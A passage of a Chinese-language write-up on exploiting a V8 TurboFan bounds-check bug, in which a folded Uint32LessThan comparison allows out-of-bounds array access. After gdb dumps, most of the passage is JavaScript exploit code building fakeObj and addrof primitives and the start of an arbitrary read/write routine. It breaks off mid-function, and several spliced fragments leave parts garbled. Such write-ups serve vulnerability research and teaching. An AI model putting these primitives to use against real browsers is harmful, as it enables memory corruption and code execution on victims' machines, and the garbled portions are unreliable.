在effect-linearizaton阶段
如果是Ture就会到分支右侧的loadElement , 如果是False就会到unreachable
所以这里就涉及到了具体的漏洞位置,就是当访问数组的时候,其中有一个Uint32LessThan比较,优化返回True就越界成功了
          if (m.IsFoldable()) {                                    // K  K
            return ReplaceBool(m.left().Value()  print m
    $1 = {
       = {
        node_ = 0x55b2010c6c10
      }, 
      members of (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::BinopMatcher, v8::internal::compiler::IntMatcher >: 
      left_ = {
        > = {
           = {
            node_ = 0x55b201109628
          }, 
          members of (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ValueMatcher: 
          value_ = 4, 
          has_value_ = true
        }, }, 
      right_ = {
        > = {
           = {
            node_ = 0x55b201109ae8
          }, 
          members of (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ValueMatcher: 
          value_ = 3, 
          has_value_ = true
        }, }
    }
可以看到right的value的值是3, left的value值是4(4poisoning_level_ ==
       1586                   PoisoningMitigationLevel::kDontPoison &&
       1587               (index_type.IsNone() || length_type.IsNone() ||
       1588                (index_type.Min() >= 0.0 &&
     ► 1589                 index_type.Max()  i registers xmm0
    xmm0           {
      v4_float = {0x0, 0x1b, 0x0, 0x0}, 
      v2_double = {0x7fffffff, 0x0}, 
      v16_int8 = {0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
      v8_int16 = {0x0, 0xffc0, 0xffff, 0x41df, 0x0, 0x0, 0x0, 0x0}, 
      v4_int32 = {0xffc00000, 0x41dfffff, 0x0, 0x0}, 
      v2_int64 = {0x41dfffffffc00000, 0x0}, 
      uint128 = 0x000000000000000041dfffffffc00000
    jbefunction foo()
    {
        let oob = [1.0,1.1,1.2];
        let m = {o:3};    '+hex(f2i(float_array_map)));
    let obj_array_map = i2f(f2i(float_array_map)+0xa0);
    console.log('[*] obj_array_map===> '+hex(f2i(obj_array_map)));
####  3.2
伪造float_obj
    function fakeobj_opt(addr)
    {
        let array = [addr,addr];
        let o = {x:2};
        array[o.x] = obj_array_map;
        return array
    }
    for(var i=0;i<0x10000;i++)
    {
        fakeobj_opt(float_array_map);
    }//
    function fakeObj(addr)//参数浮点型  返回值浮点型
    {
        // print(hex(f2i(addr)));
        let ret = fakeobj_opt(addr);
        // %DebugPrint(ret);
        return ret[0];
    }
    var float_map_obj = fakeObj(float_array_map);//ｆａｋｅ
####  3.3
addrof原语
    function addrof_opt(obj)
    {
        let array = [obj,obj];
        let o = {x:2};
        array[o.x] = float_map_obj;
        return array;
    }
    var temp_obj = {"a":1};
    for(var i=0;i<MAX_ITERATIONS;i++)
    {
        addrof_opt(temp_obj);
    }//
    function addrof(obj)//传入obj型  返回浮点
    {
        let ret = addrof_opt(obj); 
        // %DebugPrint(ret);
        return ret[0];
    }
####  3.4
任意地址读写
    function abread(addr)//参数整形  返回值整形
    {
        let adddr = addrof(fake_array);
        let test = fakeObj(i2f(f2i(adddr)-0x20));//这里的-0x..与上面fake_array的大小有关
        // %DebugPrint(test);//这是个obj 不能print